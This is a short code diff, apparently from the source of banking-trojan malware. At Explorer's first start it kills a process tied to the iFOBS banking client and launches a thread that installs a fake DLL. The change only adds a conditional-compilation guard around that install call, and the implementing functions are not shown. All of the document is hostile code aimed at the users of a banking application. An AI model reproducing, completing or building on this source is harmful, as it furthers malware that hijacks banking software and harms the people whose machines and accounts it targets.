@@ -50,7 +50,9 @@ void ExplorerFirstStart(PEventData Data)
 
 	#ifdef IFobsH
 		IFobs::KillIFobs(0);
+	#ifdef FakeDllInstallerH
 		RunThread( IFobs::IntallFakeDll,0 );
+	#endif
 	#endif
 
 	//ExecuteDocFind( 0, 0, 0 );
